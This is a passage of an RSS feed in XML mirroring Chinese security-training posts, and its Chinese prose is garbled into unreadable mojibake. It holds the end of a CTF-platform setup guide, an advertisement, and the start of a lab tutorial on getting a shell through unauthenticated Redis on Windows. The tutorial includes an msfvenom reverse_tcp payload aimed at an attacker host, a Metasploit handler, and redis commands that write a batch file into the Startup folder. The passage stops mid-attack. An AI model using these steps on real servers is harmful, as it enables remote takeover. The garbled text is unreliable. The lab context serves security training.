sqlite&amp;gt; .exit&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ç„¶åæ›´æ”¹ confs ç›®å½•æƒé™ä¸º www-data&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;sudo chown -R www-data:www-data confs/&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;b&gt;è®¾ç½® recaptcha&lt;/b&gt;&lt;/p&gt;&lt;p&gt;recaptcha åœ°å€ï¼š&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//www.google.com/recaptcha&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://www.&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;google.com/recaptcha&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;&lt;p&gt;åœ¨ä¸Šé¢æ³¨å†Œä½ çš„å¹³å°ç½‘ç«™ï¼ˆé€‰æ‹© recaptcha ç¬¬3ç‰ˆï¼‰&lt;/p&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-6e504dd8151d5921a780114ea4369bd4_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;939&quot; data-rawheight=&quot;1174&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;939&quot; data-original=&quot;https://pic1.zhimg.com/v2-6e504dd8151d5921a780114ea4369bd4_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-6e504dd8151d5921a780114ea4369bd4_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;939&quot; data-rawheight=&quot;1174&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;939&quot; data-original=&quot;https://pic1.zhimg.com/v2-6e504dd8151d5921a780114ea4369bd4_r.jpg&quot; data-actualsrc=&quot;https://pic1.zhimg.com/v2-6e504dd8151d5921a780114ea4369bd4_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;ç„¶åè·å–ç§˜é’¥ï¼š&lt;/p&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-d5b745c9c61a55ee1963cb58be17bf50_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;1409&quot; data-rawheight=&quot;667&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;1409&quot; data-original=&quot;https://pic1.zhimg.com/v2-d5b745c9c61a55ee1963cb58be17bf50_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-d5b745c9c61a55ee1963cb58be17bf50_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;1409&quot; data-rawheight=&quot;667&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;1409&quot; data-original=&quot;https://pic1.zhimg.com/v2-d5b745c9c61a55ee1963cb58be17bf50_r.jpg&quot; data-actualsrc=&quot;https://pic1.zhimg.com/v2-d5b745c9c61a55ee1963cb58be17bf50_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;åœ¨å¹³å°çš„é…ç½®æ–‡ä»¶common.phpé‡Œé¢ï¼Œä¿®æ”¹ä¸€äº›ç½‘ç«™çš„åŸºæœ¬ä¿¡æ¯ï¼ŒåŒ…æ‹¬ç½‘ç«™URLã€ä½œè€…ä¿¡æ¯ç­‰&lt;/p&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-847438c2653cca3548f01d1b0f557c50_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;858&quot; data-rawheight=&quot;685&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;858&quot; data-original=&quot;https://pic1.zhimg.com/v2-847438c2653cca3548f01d1b0f557c50_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-847438c2653cca3548f01d1b0f557c50_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;858&quot; data-rawheight=&quot;685&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;858&quot; data-original=&quot;https://pic1.zhimg.com/v2-847438c2653cca3548f01d1b0f557c50_r.jpg&quot; data-actualsrc=&quot;https://pic1.zhimg.com/v2-847438c2653cca3548f01d1b0f557c50_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;&lt;b&gt;æ›´æ¢ç§˜é’¥&lt;/b&gt;&lt;/p&gt;&lt;p&gt;ç¬¬ä¸€ä¸ªå¯†é’¥æ›¿æ¢ common.php æ–‡ä»¶é‡Œçš„ recaptcha_sitekey å†…å®¹&lt;/p&gt;&lt;p&gt;ç¬¬äºŒä¸ªå¯†é’¥ç¼–è¾‘æˆ .recaptcha_secretkey.txt æ–‡ä»¶ï¼Œæ”¾åˆ° @import/confs è·¯å¾„ä¸‹&lt;/p&gt;&lt;h2&gt;åˆ›å»ºé¢˜ç›®&lt;/h2&gt;&lt;p&gt;å¹³å°æ²¡æœ‰åå°ï¼Œæ‰€ä»¥åªèƒ½ç›´æ¥è®¿é—® sqlite3 æ•°æ®åº“æ·»åŠ é¢˜ç›®&lt;/p&gt;&lt;p&gt;æ·»åŠ é¢˜ç›®å‘½ä»¤ï¼š&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;sqlite&amp;gt; INSERT INTO &amp;#34;chals&amp;#34; VALUES(1,&amp;#39;name&amp;#39;,&amp;#39;title&amp;#39;,&amp;#39;contents&amp;#39;,100,&amp;#39;CanHackMe{xxxxxxxxxxxx}&amp;#39;,&amp;#39;web&amp;#39;,&amp;#39;1&amp;#39;,&amp;#39;2019-09-12&amp;#39;);&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æŸ¥çœ‹é¢˜ç›®ï¼š&lt;/p&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-389c954a050d187e4eaa68318159c578_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;1602&quot; data-rawheight=&quot;663&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;1602&quot; data-original=&quot;https://pic1.zhimg.com/v2-389c954a050d187e4eaa68318159c578_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-389c954a050d187e4eaa68318159c578_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;1602&quot; data-rawheight=&quot;663&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;1602&quot; data-original=&quot;https://pic1.zhimg.com/v2-389c954a050d187e4eaa68318159c578_r.jpg&quot; data-actualsrc=&quot;https://pic1.zhimg.com/v2-389c954a050d187e4eaa68318159c578_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;å‘é€å…¬å‘Šï¼š&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;sqlite&amp;gt; INSERT INTO &amp;#34;notis&amp;#34; VALUES(1,&amp;#39;xxx&amp;#39;,1,&amp;#39;2020-01-09&amp;#39;);&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-cc79cf771cf800bbed34d235ef819458_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;1319&quot; data-rawheight=&quot;398&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;1319&quot; data-original=&quot;https://pic1.zhimg.com/v2-cc79cf771cf800bbed34d235ef819458_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-cc79cf771cf800bbed34d235ef819458_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;1319&quot; data-rawheight=&quot;398&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;1319&quot; data-original=&quot;https://pic1.zhimg.com/v2-cc79cf771cf800bbed34d235ef819458_r.jpg&quot; data-actualsrc=&quot;https://pic1.zhimg.com/v2-cc79cf771cf800bbed34d235ef819458_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;&lt;b&gt;è®¾ç½® flag&lt;/b&gt;&lt;/p&gt;&lt;p&gt;flag çš„é»˜è®¤çš„æ ¼å¼ä¸º CanHackMe{...} ä¸”é•¿åº¦ä¸å°äº 10 ä½æ•°ï¼Œå¯ä»¥åœ¨ init.php æ–‡ä»¶ä¸­ä¿®æ”¹ã€‚&lt;/p&gt;&lt;p&gt;æŠŠ CanHackMe ä¿®æ”¹æˆä½ æƒ³è¦çš„æ ¼å¼ï¼š&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-a4d5e1c9ffd744591355f70842c3498e_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1001&quot; data-rawheight=&quot;76&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;1001&quot; data-original=&quot;https://pic3.zhimg.com/v2-a4d5e1c9ffd744591355f70842c3498e_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-a4d5e1c9ffd744591355f70842c3498e_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1001&quot; data-rawheight=&quot;76&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;1001&quot; data-original=&quot;https://pic3.zhimg.com/v2-a4d5e1c9ffd744591355f70842c3498e_r.jpg&quot; data-actualsrc=&quot;https://pic3.zhimg.com/v2-a4d5e1c9ffd744591355f70842c3498e_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;h2&gt;PSï¼š&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//www.baidu.com/link%3Furl%3DOcGTJIGtwpNYrGru7tSszpEf10ZQ0xIE7SvER9ejNcCar00KI-fG2lu214M4WKPc%26wd%3D%26eqid%3Da24dabb2002f492b000000065e13d46a&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;äºŒå‘ç®”å®‰å…¨&lt;/a&gt;çš„ç½‘ç»œå®‰å…¨æŠ€èƒ½åŒ…æ›´æ–°äº†ï¼æ— éœ€ç™»å½•ã€æ— éœ€æ‰«æï¼Œåªéœ€ç‚¹å‡»ä¸‹æ–¹é“¾æ¥å³å¯ç•…ç©æŠ€èƒ½åŒ…ã€‚ï¼ˆCISP-PTE æŠ€èƒ½åŒ…ã€CTF æŠ€èƒ½åŒ…å³å°†ä¸Šçº¿ï¼Œæ•¬è¯·å…³æ³¨ï¼ï¼‰&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-41a1365ee0d9566c882af75894478f08_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;2560&quot; data-rawheight=&quot;1192&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;2560&quot; data-original=&quot;https://pic1.zhimg.com/v2-41a1365ee0d9566c882af75894478f08_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-41a1365ee0d9566c882af75894478f08_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;2560&quot; data-rawheight=&quot;1192&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;2560&quot; data-original=&quot;https://pic1.zhimg.com/v2-41a1365ee0d9566c882af75894478f08_r.jpg&quot; data-actualsrc=&quot;https://pic1.zhimg.com/v2-41a1365ee0d9566c882af75894478f08_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//lelge.exeye.run/skill_library_o&quot; data-draft-node=&quot;block&quot; data-draft-type=&quot;link-card&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;æ–°æ‰‹å…¥é—¨ | æ¢¦å¢ƒç©¿è¶Š - ä¸»é¢˜æŠ€èƒ½åŒ…&lt;/a&gt;&lt;p&gt;æ›´å¤šæœ‰å…³æ¸—é€æµ‹è¯•çš„å†…å®¹è¯·å‰å¾€&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//www.baidu.com/link%3Furl%3DOcGTJIGtwpNYrGru7tSszpEf10ZQ0xIE7SvER9ejNcCar00KI-fG2lu214M4WKPc%26wd%3D%26eqid%3Da24dabb2002f492b000000065e13d46a&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;äºŒå‘ç®”å®‰å…¨&lt;/a&gt;è¿›è¡Œå­¦ä¹ ï¼Œæœ€è¿‘æ¨å‡ºäº†â€œæŒ–æ´â€ç­ï¼Œæƒ³äº†è§£æ›´å¤šèµ„è®¯çš„ï¼Œå¯å’¨è¯¢å®¢æœå¾®ä¿¡ &lt;b&gt;twosecurity02&lt;/b&gt;&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;3041&quot; data-rawheight=&quot;2000&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;3041&quot; data-original=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;3041&quot; data-rawheight=&quot;2000&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;3041&quot; data-original=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_r.jpg&quot; data-actualsrc=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_b.jpg&quot;/&gt;&lt;/figure&gt;</description>
<author>äºŒå‘ç®”å®‰å…¨å­¦é™¢</author>
<guid isPermaLink="false">2020-01-09-101994123</guid>
<pubDate>Thu, 09 Jan 2020 00:00:00 +0800</pubDate>
</item>
<item>
<title>å¸®è½¬è½¬</title>
<link>https://henix.github.io/feeds/zhuanlan.twosecurity/2020-01-09-101955934.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/101955934&quot;&gt;åŸæ–‡&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-41a1365ee0d9566c882af75894478f08_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;2560&quot; data-rawheight=&quot;1192&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;2560&quot; data-original=&quot;https://pic1.zhimg.com/v2-41a1365ee0d9566c882af75894478f08_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-41a1365ee0d9566c882af75894478f08_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;2560&quot; data-rawheight=&quot;1192&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;2560&quot; data-original=&quot;https://pic1.zhimg.com/v2-41a1365ee0d9566c882af75894478f08_r.jpg&quot; data-actualsrc=&quot;https://pic1.zhimg.com/v2-41a1365ee0d9566c882af75894478f08_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//lelge.exeye.run/skill_library_o&quot; data-draft-node=&quot;block&quot; data-draft-type=&quot;link-card&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;æ–°æ‰‹å…¥é—¨ | æ¢¦å¢ƒç©¿è¶Š - ä¸»é¢˜æŠ€èƒ½åŒ…&lt;/a&gt;&lt;p&gt;&lt;b&gt;                                                                 ç‚¹è¿›å»ï¼Œç›´æ¥ç©&lt;/b&gt;&lt;/p&gt;</description>
<author>äºŒå‘ç®”å®‰å…¨å­¦é™¢</author>
<guid isPermaLink="false">2020-01-09-101955934</guid>
<pubDate>Thu, 09 Jan 2020 00:00:00 +0800</pubDate>
</item>
<item>
<title>Windowsä¸‹Redis Getshellæ€»ç»“</title>
<link>https://henix.github.io/feeds/zhuanlan.twosecurity/2020-01-08-101701119.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/101701119&quot;&gt;åŸæ–‡&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-650ce066a43c3fdedd0bcaff2bd3e5ff_b.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;h2&gt;Redis&lt;/h2&gt;&lt;p&gt;Redis æ˜¯ä¸€ä¸ªå¼€æºçš„é«˜æ€§èƒ½é”®å€¼æ•°æ®åº“ã€‚æœ€çƒ­é—¨çš„ NoSql æ•°æ®åº“ä¹‹ä¸€ï¼Œä¹Ÿè¢«äººä»¬ç§°ä¸ºæ•°æ®ç»“æ„æœåŠ¡å™¨ã€‚&lt;/p&gt;&lt;p&gt;å®ƒæœ€çªå‡ºçš„ç‰¹ç‚¹å°±æ˜¯ï¼š&lt;b&gt;å¿«&lt;/b&gt;&lt;/p&gt;&lt;ul&gt;&lt;li&gt;ä»¥å†…å­˜ä½œä¸ºæ•°æ®å­˜å‚¨ä»‹è´¨ï¼Œè¯»å†™æ•°æ®çš„æ•ˆç‡æé«˜ã€‚&lt;/li&gt;&lt;li&gt;è·Ÿ memcache ä¸åŒçš„æ˜¯ï¼Œå‚¨å­˜åœ¨ Redis ä¸­çš„æ•°æ®æ˜¯æŒä¹…åŒ–çš„ï¼Œæ–­ç”µæˆ–é‡å¯ï¼Œæ•°æ®ä¹Ÿä¸ä¼šä¸¢å¤±ã€‚&lt;/li&gt;&lt;li&gt;å­˜å‚¨åˆ†ä¸ºå†…å­˜å­˜å‚¨ã€ç£ç›˜å­˜å‚¨å’Œ log æ–‡ä»¶ã€‚&lt;/li&gt;&lt;li&gt;å¯ä»¥ä»ç£ç›˜é‡æ–°å°†æ•°æ®åŠ è½½åˆ°å†…å­˜ä¸­ï¼Œä¹Ÿå¯ä»¥é€šè¿‡é…ç½®æ–‡ä»¶å¯¹å…¶è¿›è¡Œé…ç½®ï¼Œå› æ­¤ï¼Œredis æ‰èƒ½å®ç°æŒä¹…åŒ–ã€‚&lt;/li&gt;&lt;li&gt;æ”¯æŒä¸»ä»æ¨¡å¼ï¼Œå¯ä»¥é…ç½®é›†ç¾¤ï¼Œæ›´åˆ©äºæ”¯æ’‘å¤§å‹çš„é¡¹ç›®ã€‚&lt;/li&gt;&lt;/ul&gt;&lt;h2&gt;æ­å»ºç¯å¢ƒ&lt;/h2&gt;&lt;p&gt;é¶æœº Windows Server 2012 &lt;/p&gt;&lt;p&gt;æ”»å‡»æœºï¼škali linux&lt;/p&gt;&lt;p&gt;Redis ä¸‹è½½ï¼š&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//github.com/microsoftarchive/redis&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;github.com/microsoftarc&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;hive/redis&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt; ï¼ˆè¿™é‡Œç”¨çš„æ˜¯ &lt;a href=&quot;https://link.zhihu.com/?target=https%3A//github.com/microsoftarchive/redis/releases/download/win-3.2.100/Redis-x64-3.2.100.msi&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;3.2.100 ç‰ˆæœ¬&lt;/a&gt;ï¼‰&lt;/p&gt;&lt;p&gt;å®‰è£…å®Œ Redis åä¼šè‡ªåŠ¨å¯åŠ¨ï¼Œå…ˆåœæ­¢ Redis æœåŠ¡&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;redis-server --service-stop&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;b&gt;æ›´æ”¹é…ç½®æ–‡ä»¶&lt;/b&gt;&lt;/p&gt;&lt;p&gt;è¿›å…¥ Redis çš„å®‰è£…ç›®å½•ï¼Œç„¶åä¿®æ”¹ windows.conf æ–‡ä»¶&lt;/p&gt;&lt;p&gt;æ³¨é‡Šæ‰# bind 127.0.0.1&lt;/p&gt;&lt;p&gt;æŠŠ protected-mode yes æ”¹æˆ protected-mode no&lt;/p&gt;&lt;p&gt;è¿™æ ·å°±å¯ä»¥æ¨¡æ‹Ÿæœªæˆæƒè®¿é—®çš„ Redis é¶æœºã€‚&lt;/p&gt;&lt;p&gt;&lt;b&gt;ç«¯å£è®¾ç½®&lt;/b&gt;&lt;/p&gt;&lt;p&gt;Redis é»˜è®¤ç«¯å£æ˜¯ 6379ï¼Œæ‰€ä»¥éœ€è¦åœ¨ windows çš„é˜²ç«å¢™é‡Œå¼€æ”¾ 6379 ç«¯å£ï¼Œæˆ–è€…é¶æœºç›´æ¥å°±å…³é—­é˜²ç«å¢™ã€‚&lt;/p&gt;&lt;p&gt;&lt;b&gt;æµ‹è¯•æœªæˆæƒè®¿é—®&lt;/b&gt;&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;./redis-cli -h xxx.xxx.xxx.xxx&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;b&gt;é…ç½® Windows server 2012&lt;/b&gt;&lt;/p&gt;&lt;p&gt;é»˜è®¤æ˜¯æ— æ³•åœ¨å¯åŠ¨é¡¹æ–‡ä»¶å¤¹å†™æ–‡ä»¶çš„ï¼Œéœ€è¦æŠŠ C:\Users\Administrator æ–‡ä»¶å¤¹çš„ç»„æ·»åŠ ä¸Š Everyone å¹¶æŠŠæƒé™æ”¹æˆå®Œå…¨æ§åˆ¶ã€‚&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;config set dir &amp;#34;C:/Users/Administrator/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/startup/&amp;#34;
OK&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;b&gt;ç›¸å…³å‘½ä»¤ï¼š&lt;/b&gt;&lt;/p&gt;&lt;p&gt;å¸è½½ Redis æœåŠ¡&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;redis-server --service-uninstall&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å®‰è£… Redis æœåŠ¡&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;redis-server --service-install redis.windows.conf&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å¯åŠ¨ Redis æœåŠ¡&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;redis-server --service-start &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;b&gt;ä¸‹é¢ä»‹ç»ä»Šå¤©çš„ä¸»é¢˜ï¼Œå‡ ç§ Redis Getshell çš„æ–¹æ³•&lt;/b&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;å‡ ç§ &lt;/b&gt;Redis&lt;b&gt; Getshell æ–¹æ³•&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;&lt;b&gt;001â€”â€”åˆ©ç”¨ powershell åå¼¹ shell&lt;/b&gt;&lt;/p&gt;&lt;p&gt;å…ˆç”¨ msfvenom ç”Ÿæˆ shell.ps1 æ–‡ä»¶&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=Kaliçš„IP LPORT=4444 -f psh-reflection &amp;gt;shell.ps1&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ç„¶åæŠŠ shell.ps1 æ–‡ä»¶å¤åˆ¶åˆ° /var/www/html ç›®å½•ä¸‹ï¼Œç„¶åå¯åŠ¨ apache2&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-c83c0eed4b1814ea5bf58af171173775_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1269&quot; data-rawheight=&quot;208&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;1269&quot; data-original=&quot;https://pic2.zhimg.com/v2-c83c0eed4b1814ea5bf58af171173775_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-c83c0eed4b1814ea5bf58af171173775_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1269&quot; data-rawheight=&quot;208&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;1269&quot; data-original=&quot;https://pic2.zhimg.com/v2-c83c0eed4b1814ea5bf58af171173775_r.jpg&quot; data-actualsrc=&quot;https://pic2.zhimg.com/v2-c83c0eed4b1814ea5bf58af171173775_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;ç”¨ msf è¿›è¡Œç›‘å¬ï¼Œè®¾ç½® payload çš„æ—¶å€™æ³¨æ„åŒºåˆ† 32 ä½å’Œ 64 ä½æ“ä½œç³»ç»Ÿ&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;msf5 &amp;gt; use exploit/multi/handler 
msf5 exploit(multi/handler) &amp;gt; set payload windows/x64/meterpreter/reverse_tcp
payload =&amp;gt; windows/x64/meterpreter/reverse_tcp&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-7546e33183f68b3405a6f4d168a4a520_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;890&quot; data-rawheight=&quot;228&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;890&quot; data-original=&quot;https://pic1.zhimg.com/v2-7546e33183f68b3405a6f4d168a4a520_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-7546e33183f68b3405a6f4d168a4a520_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;890&quot; data-rawheight=&quot;228&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;890&quot; data-original=&quot;https://pic1.zhimg.com/v2-7546e33183f68b3405a6f4d168a4a520_r.jpg&quot; data-actualsrc=&quot;https://pic1.zhimg.com/v2-7546e33183f68b3405a6f4d168a4a520_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;åˆ©ç”¨ Redis å†™å…¥ bat æ–‡ä»¶åˆ°å¯åŠ¨é¡¹&lt;/p&gt;&lt;p&gt;æ³¨æ„  \r\n\r\n ä»£è¡¨æ¢è¡Œçš„æ„æ€ï¼Œå› ä¸ºç”¨ redis å†™çš„æ–‡ä»¶ä¼šè‡ªå¸¦ä¸€äº›ç‰ˆæœ¬ä¿¡æ¯ï¼Œå¦‚æœä¸æ¢è¡Œå¯èƒ½ä¼šå¯¼è‡´æ— æ³•æ‰§è¡Œã€‚åæ–œæ ç”¨æ¥è½¬ä¹‰ payload ä¸­çš„åŒå¼•å·ã€‚&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;xxx.xxx.xxx.1:6379&amp;gt; config set dir &amp;#34;C:/Users/Administrator/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/startup/&amp;#34;
OK
xxx.xxx.xxx.1:6379&amp;gt; config set dbfilename shell.bat
OK
